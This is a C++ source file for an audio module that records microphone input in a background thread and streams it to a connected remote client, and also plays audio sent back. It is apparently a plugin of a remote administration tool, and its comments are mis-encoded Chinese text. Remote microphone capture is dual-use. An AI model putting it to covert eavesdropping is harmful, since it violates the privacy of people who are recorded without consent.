#include "Audio.h"



volatile unsigned int CAudio::nInstance = 0;

CAudio::CAudio(CClient *pClient, Module * owner) :
CEventHandler(pClient, AUDIO)
{
	m_hWorkThread = NULL;			// grab thread.
	m_IsWorking = FALSE;			// 
	m_owner = owner;

	if (m_owner)
		get_module(m_owner);
}


CAudio::~CAudio()
{
	if (m_owner)
		put_module(m_owner);
}

void CAudio::OnOpen()
{
	if (InterlockedExchangeAdd(&nInstance, 1) > 0)
	{
		//�Ѿ���һ��ʵ����.
		TCHAR szError[] = TEXT("One instance is already running");
		Send(AUDIO_ERROR, szError, sizeof(TCHAR ) * (lstrlen(szError) + 1));
		Send(-1, NULL, 0);
		Close();
		return;
	}
}

void CAudio::OnClose()
{
	OnAudioStop();
	OnAudioPlayStop();
	InterlockedDecrement(&nInstance);
}

void CAudio::OnEvent(UINT32 e, BYTE* lpData, UINT Size)
{
	switch (e)
	{
	case AUDIO_BEGIN:
		OnAudioBegin();
		break;
	case AUDIO_STOP:
		OnAudioStop();
		break;
	case AUDIO_PLAY_BEGIN:
		OnAudioPlayBegin();
		break;
	case AUDIO_PLAY_STOP:
		OnAudioPlayStop();
		break;
	case AUDIO_PLAY_DATA:
		OnAudioPlayData(lpData, Size);
		break;
	default:
		break;
	}
}

void CAudio::OnAudioPlayBegin()
{
	OnAudioPlayStop();
	m_AudioPlay.InitPlayer();
}

void CAudio::OnAudioPlayStop()
{
	m_AudioPlay.ClosePlayer();
}

void CAudio::OnAudioPlayData(BYTE* lpData, DWORD size){
	if (!m_AudioPlay.IsWorking())
	{
		TCHAR szError[] = TEXT("m_AudioPlay.IsWorking() Is False");
		Send(AUDIO_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}

	if (!m_AudioPlay.PlayBuffer(lpData, size))
	{
		TCHAR szError[] = TEXT("m_AudioPlay.PlayBuffer() Failed!");
		Send(AUDIO_ERROR, szError, sizeof(TCHAR) * (lstrlen(szError) + 1));
		return;
	}
}

void CAudio::OnAudioBegin()
{
	TCHAR szError[] = TEXT("Audio Init Grabber Failed");
	OnAudioStop();

	InterlockedExchange(&m_IsWorking, TRUE);

	if (m_AudioGrab.InitGrabber())
	{
		Send(AUDIO_PLAY_BEGIN, 0, 0);		//֪ͨ�Է��򿪲�����...
		m_hWorkThread = CreateThread(
			0,
			0, 
			(LPTHREAD_START_ROUTINE)WorkThread, 
			this,
			0, 
			0);
	}
	else
	{
		InterlockedExchange(&m_IsWorking, FALSE);
		Send(AUDIO_ERROR, (char*)szError, sizeof(TCHAR)*(lstrlen(szError) + 1));
	}
}

void CAudio::OnAudioStop()
{
	//ֹͣ�����߳�.
	InterlockedExchange(&m_IsWorking, FALSE);
	if (m_hWorkThread)
	{
		WaitForSingleObject(m_hWorkThread,INFINITE);
		CloseHandle(m_hWorkThread);
		m_hWorkThread = NULL;
	}
	//�ر�grabber..
	m_AudioGrab.CloseGrabber();
	Send(AUDIO_PLAY_STOP, 0, 0);		//֪ͨ�Է��رղ�����.
}

void __stdcall CAudio::WorkThread(CAudio*pThis)
{
	TCHAR szError[] = TEXT("Get Audio Buffer Error!");
	while (InterlockedExchange(&pThis->m_IsWorking, TRUE))
	{
		char*Buffer = NULL;
		DWORD dwLen = NULL;
		//��ȡbuffer����
		if (pThis->m_AudioGrab.GetBuffer((void**)&Buffer, &dwLen))
		{
			pThis->Send(AUDIO_PLAY_DATA, Buffer, dwLen);
			free(Buffer);
		}
	}
	InterlockedExchange(&pThis->m_IsWorking, FALSE);
}